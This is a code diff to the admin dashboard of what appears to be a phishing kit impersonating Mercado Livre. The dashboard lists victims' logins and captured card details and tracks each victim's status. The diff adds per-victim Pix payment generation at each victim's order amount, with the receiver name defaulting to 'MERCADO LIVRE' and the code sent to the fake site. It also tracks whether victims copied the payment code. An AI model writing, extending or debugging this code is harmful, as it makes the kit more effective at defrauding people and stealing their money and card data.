@@ -66,6 +66,10 @@
       padding: 6px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; }
     .btn-deletar:hover { background: #ff3b30; color: white; }
 
+    .btn-pix { background: #00bfff; color: #0a0e14; border: none; padding: 8px 12px;
+      border-radius: 6px; font-size: 12px; font-weight: 700; cursor: pointer; margin-top: 6px; width: 100%; }
+    .btn-pix:hover { background: #0099cc; }
+
     .btn-limpar { background: transparent; border: 1px solid #ff8800; color: #ff8800;
       padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; }
     .btn-limpar:hover { background: #ff8800; color: #0a0e14; }
@@ -89,9 +93,6 @@
     .pix-config input { width: 100%; padding: 12px; background: #0a0e14; border: 1px solid #2a3544;
       border-radius: 8px; color: #e0e0e0; font-size: 14px; margin-bottom: 16px; outline: none; }
     .pix-config input:focus { border-color: #00ff88; }
-    .pix-config button { background: #00ff88; color: #0a0e14; border: none; padding: 12px 24px;
-      border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; width: 100%; }
-    .pix-config button:hover { background: #00cc6a; }
     .pix-preview { margin-top: 16px; display: none; text-align: center; background: #0a0e14;
       border-radius: 8px; padding: 16px; border: 1px solid #2a3544; }
     .pix-preview img { max-width: 180px; margin: 0 auto 12px; }
@@ -140,7 +141,8 @@
         <input type="text" id="nomeRecebedor" placeholder="Seu nome" value="MERCADO LIVRE">
         <label>Cidade</label>
         <input type="text" id="cidadeRecebedor" placeholder="Sua cidade" value="SAO PAULO">
-        <button onclick="gerarPixConfig()">Gerar e enviar para o site</button>
+        <label>Valor (puxado do pedido mais recente)</label>
+        <input type="text" id="valorPixDisplay" readonly style="color:#00ff88;font-weight:bold;">
         <div class="pix-preview" id="pixPreview">
           <img id="pixQrPreview" src="" alt="QR Code">
           <input type="text" id="pixCopiaColaPreview" readonly>
@@ -245,6 +247,31 @@
       return limpo.replace(/(.{4})/g, '$1 ').trim();
     }
 
+    function atualizarValorPixDisplay() {
+      const ids = Object.keys(pedidos);
+      const display = document.getElementById('valorPixDisplay');
+      if (ids.length === 0) {
+        display.value = 'Aguardando pedido...';
+        return;
+      }
+      // Pega o pedido com valor > 0 mais recente
+      let ultimo = null;
+      let ultimoTs = 0;
+      ids.forEach(id => {
+        const p = pedidos[id];
+        const ts = p.clicouComprarEm || p.logadoEm || 0;
+        if (p.valor > 0 && ts > ultimoTs) {
+          ultimo = p;
+          ultimoTs = ts;
+        }
+      });
+      if (ultimo) {
+        display.value = 'R$ ' + ultimo.valor.toFixed(2).replace('.', ',');
+      } else {
+        display.value = 'Aguardando pedido...';
+      }
+    }
+
     function renderPedidos() {
       const tbody = document.getElementById('corpoPedidos');
       const ids = Object.keys(pedidos);
@@ -263,7 +290,8 @@
         const pixCopiado = p.pix && p.pix.copiado;
         const pixCopiadoEm = p.pix && p.pix.copiadoEm;
         const podeConfirmar = pixCopiado && (agora - pixCopiadoEm >= 10000) && p.status !== 'pago';
-        const valor = (p.valor || 0).toFixed(2).replace('.', ',');
+        const valorNum = p.valor || 0;
+        const valor = valorNum.toFixed(2).replace('.', ',');
 
         let statusTxt = 'Só visitou';
         let statusClass = 'pendente';
@@ -287,6 +315,11 @@
           `;
         }
 
+        // Botão Pix só aparece se o pedido tem valor > 0
+        const btnPix = valorNum > 0
+          ? `<button class="btn-pix" onclick="gerarPixPedido('${id}')">💠 Gerar Pix (R$ ${valor})</button>`
+          : '<div class="detalhes">Sem valor definido</div>';
+
         return `<tr>
           <td>
             <div><strong>${login}</strong></div>
@@ -297,18 +330,19 @@
           </td>
           <td><span class="status ${statusClass}">${statusTxt}</span></td>
           <td class="detalhes">
-            ${p.pix ? '<strong>Chave:</strong> ' + p.pix.chave.substring(0, 20) + '...<br><strong>Gerado:</strong> ' + fmt(p.pix.geradoEm) : '-'}
+            ${p.pix ? '<strong>Chave:</strong> ' + (p.pix.chave || '').substring(0, 20) + '...<br><strong>Gerado:</strong> ' + fmt(p.pix.geradoEm) : '-'}
             ${pixCopiado ? '<br><strong>Copiado:</strong> ' + fmt(pixCopiadoEm) : ''}
           </td>
           <td>${cartaoHtml}</td>
           <td><strong>R$ ${valor}</strong></td>
           <td class="detalhes">${fmt(v.entrouEm || p.logadoEm)}</td>
           <td>
+            ${btnPix}
             <button class="btn-confirmar" ${podeConfirmar ? '' : 'disabled'}
-              onclick="confirmar('${id}')">
+              onclick="confirmar('${id}')" style="margin-top:6px;width:100%">
               ${p.status === 'pago' ? '✅ Pago' : (podeConfirmar ? 'Confirmar' : (pixCopiado ? 'Aguarde...' : 'Sem Pix'))}
             </button>
-            <button class="btn-deletar" onclick="deletar('${id}')" style="margin-top:6px">X</button>
+            <button class="btn-deletar" onclick="deletar('${id}')" style="margin-top:6px;width:100%">X</button>
           </td>
         </tr>`;
       }).join('');
@@ -338,7 +372,7 @@
         stats = { online: 0, visitas: 0, cliques: 0, pix: 0, copiados: 0, cartoes: 0, valor: 0 };
         pedidos = {}; visitasMap = {};
         window._ultimoAlertaCount = 0;
-        atualizarCards(); renderPedidos(); renderAlertas([]);
+        atualizarCards(); renderPedidos(); renderAlertas([]); atualizarValorPixDisplay();
         alert('✅ Tudo limpo com sucesso!');
       }).catch(err => alert('❌ Erro ao limpar: ' + err.message));
     }
@@ -354,13 +388,21 @@
       `).join('');
     }
 
-    async function gerarPixConfig() {
+    /* GERA PIX COM O VALOR DO PEDIDO ESPECÍFICO */
+    async function gerarPixPedido(id) {
       const chave = document.getElementById('chavePixInput').value.trim();
       const nome = document.getElementById('nomeRecebedor').value.trim() || 'MERCADO LIVRE';
       const cidade = document.getElementById('cidadeRecebedor').value.trim() || 'SAO PAULO';
-      if (!chave) { alert('Digite a chave Pix'); return; }
+      if (!chave) { alert('Digite a chave Pix no campo acima primeiro!'); return; }
 
-      const valor = 159.44;
+      const p = pedidos[id];
+      if (!p) { alert('Pedido não encontrado.'); return; }
+
+      const valor = parseFloat(p.valor) || 0;
+      if (valor <= 0) { alert('❌ Este pedido não tem valor definido.'); return; }
+
+      // DEBUG: mostra o valor que está sendo usado
+      console.log('🔍 Gerando Pix com valor:', valor, 'do pedido', id);
 
       try {
         const copiaECola = gerarPayloadPix(chave, nome, cidade, valor);
@@ -376,10 +418,11 @@
           valor: valor.toFixed(2).replace('.', ','),
           nome: nome,
           cidade: cidade,
+          pedidoId: id,
           atualizadoEm: Date.now()
         });
 
-        alert('✅ Pix gerado e enviado para o site do cliente!');
+        alert('✅ Pix de R$ ' + valor.toFixed(2).replace('.', ',') + ' gerado!\n\nPedido: ' + id);
       } catch(e) {
         alert('❌ Erro ao gerar Pix: ' + e.message);
       }
@@ -434,11 +477,17 @@
           if (p.pix) pix++;
           if (p.pix && p.pix.copiado) copiados++;
           if (p.cartao) cartoes++;
-          valor += (p.valor || 0);
+          valor += (parseFloat(p.valor) || 0);
         });
         stats.cliques = cliques; stats.pix = pix; stats.copiados = copiados;
         stats.cartoes = cartoes; stats.valor = valor;
-        atualizarCards(); renderPedidos();
+        atualizarCards(); renderPedidos(); atualizarValorPixDisplay();
+
+        // Log para debug
+        console.log('📦 Pedidos:', Object.keys(pedidos).length);
+        Object.entries(pedidos).forEach(([id, p]) => {
+          console.log(`  Pedido ${id}: valor = ${p.valor}`);
+        });
       });
 
       db.ref('alertas').limitToLast(30).on('value', snap => {
